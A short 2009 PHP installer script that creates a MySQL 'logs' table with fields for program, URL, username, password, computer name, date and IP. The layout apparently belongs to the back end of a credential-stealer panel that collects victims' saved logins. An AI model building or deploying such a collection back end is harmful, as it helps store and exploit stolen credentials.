<?php
//*****************************************
// Author: icyinferno
// E-mail: 1cy1nferno109@gmail.com
// Copyright ©2009, IcyInferno Productions 
//*****************************************
require_once 'db_login.php';

$c = mysql_connect(web_dbHost, web_dbUser, web_dbPass) or die('Could not connect');
	 mysql_select_db(web_dbDatabase, $c) or die('Could not select database');
	 mysql_query("CREATE TABLE logs (
	 			  cid INT PRIMARY KEY AUTO_INCREMENT NOT NULL,
				  program VARCHAR(155) NOT NULL,
				  url VARCHAR(155) NOT NULL,
				  user VARCHAR(155) NOT NULL,
				  password VARCHAR(155) NOT NULL,
				  computer VARCHAR(155) NOT NULL,
				  date VARCHAR(155) NOT NULL,
				  ip VARCHAR(15) NOT NULL
			      )", $c);
	mysql_close($c);
	
	echo "Tables have been successfully added! You no longer need installer.php, delete it.";
?>